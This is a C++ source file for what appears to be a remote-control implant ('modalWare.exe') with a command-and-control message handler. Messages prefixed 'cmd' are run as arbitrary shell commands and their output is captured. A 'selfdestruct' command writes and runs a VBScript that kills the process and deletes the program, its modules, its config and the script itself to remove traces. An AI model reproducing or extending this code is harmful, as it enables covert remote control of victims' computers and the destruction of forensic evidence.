#include <iostream>
#include <cstdio>
#include <memory>
#include <array>
#include <string>
#include <fstream>
#include "CommandsAndControll.h"

#define SELFDESTRUCT_NAME "cleaner.vbs"

static ReturnData exec(const std::string& cmd);
static int selfDestruct();

ReturnData processMessage(const std::string& message) {
    ReturnData result;
	if (message.length() > 2 && message.substr(0, 3) == "cmd") {
        result = exec(message.substr(4));
        switch (result.result) {
        case StatusCode::SUCCESS:
            std::cout << "Success" << std::endl;
            break;
        case StatusCode::FAILURE:
            std::cout << "Failure" << std::endl;
        }
	}
    if (message == "selfdestruct") {
        if (selfDestruct()) {
            std::cout << "Self destruction failed";
        };
    }
    return result;
}
static ReturnData exec(const std::string& cmd) {
    std::array<char, 128> buffer;
    std::string result;

    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) {
        char errorMsg[256];
        strerror_s(errorMsg, sizeof(errorMsg), errno);
        result = "Failed to run command: " + std::string(errorMsg);

        std::cout << "Failed to run command" << std::endl;
        return {StatusCode::FAILURE, result};
    }

    // Read the output line by line
    while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
        result += buffer.data();
    }

    // Close the pipe
    _pclose(pipe);

    // Print the captured result
    std::cout << "Command Output:" << std::endl;
    std::cout << result << std::endl;

    return {StatusCode::SUCCESS, result};
}
static int selfDestruct() {
    std::string vbScriptCode = R"(
    Dim fso, folder, moduleFolder
    Dim subFolder, file, currentDir, scriptFile, objShell

    Set fso = CreateObject("Scripting.FileSystemObject")

    currentDir = fso.GetParentFolderName(WScript.ScriptFullName)

    moduleFolder = currentDir & "\Modules"

    If fso.FolderExists(moduleFolder) Then
        Set folder = fso.GetFolder(moduleFolder)
    
        For Each file In folder.Files
            file.Delete
        Next
    
        For Each subFolder In folder.Subfolders
            DeleteFolderRecursively subFolder
        Next

        folder.Delete
    End If

    Set objShell = CreateObject("WScript.Shell")

    objShell.Run "taskkill /F /IM modalWare.exe", 0, True

    exeFile = currentDir & "\modalWare.exe"
    If fso.FileExists(exeFile) Then
        fso.DeleteFile exeFile
    End If
    configFile = currentDir & "\config"
    If fso.FileExists(configFile) Then
        fso.DeleteFile configFile
    End If

    scriptFile = WScript.ScriptFullName
    fso.DeleteFile(scriptFile)


    Sub DeleteFolderRecursively(fldr)
        Dim subFile, subSubFolder

        For Each subFile In fldr.Files
            subFile.Delete
        Next
    
        For Each subSubFolder In fldr.Subfolders
            DeleteFolderRecursively subSubFolder
        Next
        
        fldr.Delete
    End Sub
    )";

    std::ofstream outFile(SELFDESTRUCT_NAME);

    if (outFile.is_open()) {
        outFile << vbScriptCode;

        outFile.close();

        std::cout << "VBScript file 'delete_script.vbs' has been created successfully." << std::endl;
    }
    else {
        std::cerr << "Error opening the file for writing!" << std::endl;
    }
    system(".\\" SELFDESTRUCT_NAME);

    return 1;
}